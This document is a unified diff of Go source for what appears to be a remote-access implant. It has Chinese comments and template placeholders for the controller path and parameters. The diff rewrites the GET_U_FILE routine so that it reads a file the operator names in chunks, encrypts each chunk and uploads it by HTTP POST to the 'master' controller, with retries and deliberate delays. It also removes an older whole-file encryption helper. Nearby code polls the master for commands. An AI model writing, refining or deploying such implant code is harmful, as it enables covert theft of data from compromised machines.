@@ -695,52 +695,83 @@ func send() { //发送头部信息
         }
     }
     func GET_U_FILE(cmd, splitSize string) {
-	    intSize, _ := strconv.Atoi(splitSize)
-	    fileContent, _ := get_encry_f(cmd)
-	    fileSize := len(fileContent)
-	    start := 0
-	    var maxRetry int
-	    a_Mutex.RLock();if delay < 30 {maxRetry = 30} else {maxRetry = delay};a_Mutex.RUnlock()
-	    end := intSize
-	    for start < fileSize {
-	        if end > fileSize {
-	            end = fileSize
-	        }
-	        chunk := fileContent[start:end]
-	        retryCount := 0
-	        for retryCount < maxRetry {
-	            str_encry := user + "*//*" + splitSize + "*//*" + strconv.Itoa(fileSize) + "*//*" + strconv.Itoa(start) + "*//*" + strconv.Itoa(end)
-	            data_encry := get_encry_s(&str_encry)
-	            var buffer bytes.Buffer
-	            writer := multipart.NewWriter(&buffer)
-	            part, _ := writer.CreateFormFile("/*upload*/", get_encry_s(&cmd))
-	            io.Copy(part, bytes.NewReader(chunk))
-	            writer.WriteField("/*uid*/", uid)
-	            writer.WriteField("/*result*/", data_encry)
-	            writer.Close()
-	            url := protocol + master + "//*Path*/?/*option*/=/*upload*/"
-	            req, _ := http.NewRequest("POST", url, &buffer)
-	            req.Header.Set("Content-Type", writer.FormDataContentType())
-	            req.Header.Set("Range", "bytes "+strconv.Itoa(start)+"-"+strconv.Itoa(end-1))
-	            resp, err := client.Do(req)
-	            if err == nil && resp.StatusCode == http.StatusOK {
-	                resp.Body.Close()
-	                break
-	            }
-	            if resp != nil {
-	                resp.Body.Close()
-	            }
-	            retryCount++
-	            time.Sleep(2 * time.Second)
-	        }
-	        if retryCount >= maxRetry {
-	            return
-	        }
-	        start = end
-	        end = start + intSize
-	        a_Mutex.RLock();time.Sleep(time.Duration(delay) * time.Second);a_Mutex.RUnlock()
-	    }
-	}
+        intSize, _ := strconv.Atoi(splitSize)
+        if intSize <= 0 {
+            return
+        }
+        info, err := os.Stat(cmd)
+        if err != nil {
+            return
+        }
+        fileSize := int(info.Size())
+        if fileSize == 0 {
+            return
+        }
+        f, err := os.Open(cmd)
+        if err != nil {
+            return
+        }
+        defer f.Close()
+        var maxRetry int
+        a_Mutex.RLock()
+        if delay < 30 {
+            maxRetry = 30
+        } else {
+            maxRetry = delay
+        }
+        a_Mutex.RUnlock()
+        start := 0
+        buf := make([]byte, intSize)
+        for start < fileSize {
+            end := start + intSize
+            if end > fileSize {
+                end = fileSize
+            }
+            chunkSize := end - start
+            n, err := io.ReadFull(f, buf[:chunkSize])
+            if err != nil && err != io.ErrUnexpectedEOF {
+                return
+            }
+            rawChunk := buf[:n]
+            encryptedChunk := Encrypt(rawChunk)
+            if encryptedChunk == nil {
+                return
+            }
+            retryCount := 0
+            for retryCount < maxRetry {
+                str_encry := user + "*//*" + splitSize + "*//*" + strconv.Itoa(fileSize) + "*//*" + strconv.Itoa(start) + "*//*" + strconv.Itoa(end)
+                data_encry := get_encry_s(&str_encry)
+                var buffer bytes.Buffer
+                writer := multipart.NewWriter(&buffer)
+                part, _ := writer.CreateFormFile("/*upload*/", get_encry_s(&cmd))
+                io.Copy(part, bytes.NewReader(encryptedChunk))
+                writer.WriteField("/*uid*/", uid)
+                writer.WriteField("/*result*/", data_encry)
+                writer.Close()
+                url := protocol + master + "//*Path*/?/*option*/=/*upload*/"
+                req, _ := http.NewRequest("POST", url, &buffer)
+                req.Header.Set("Content-Type", writer.FormDataContentType())
+                req.Header.Set("Range", "bytes "+strconv.Itoa(start)+"-"+strconv.Itoa(end-1))
+                resp, err := client.Do(req)
+                if err == nil && resp.StatusCode == http.StatusOK {
+                    resp.Body.Close()
+                    break
+                }
+                if resp != nil {
+                    resp.Body.Close()
+                }
+                retryCount++
+                time.Sleep(2 * time.Second)
+            }
+            if retryCount >= maxRetry {
+                return
+            }
+            start = end
+            a_Mutex.RLock()
+            time.Sleep(time.Duration(delay) * time.Second)
+            a_Mutex.RUnlock()
+        }
+    }
     func getCmd() {
         url := protocol + master + "//*Path*/?/*option*/=/*MsgPath*/&/*uid*/=" + uid
         re_url := protocol + master + "//*Path*/?/*option*/=/*result*/"
@@ -1044,14 +1075,6 @@ func send() { //发送头部信息
             out[i]=data[i]^fuscateKey[i%len(fuscateKey)]
         }
         return out
-    }
-    // 文件加密函数
-    func get_encry_f(filePath string) ([]byte, error) {
-        data, err := os.ReadFile(filePath)
-        if err != nil {
-            return nil, err
-        }
-        return Encrypt(data), nil
     }
     // 文件解密函数
     func get_decry_f(filepath string, data []byte) error {
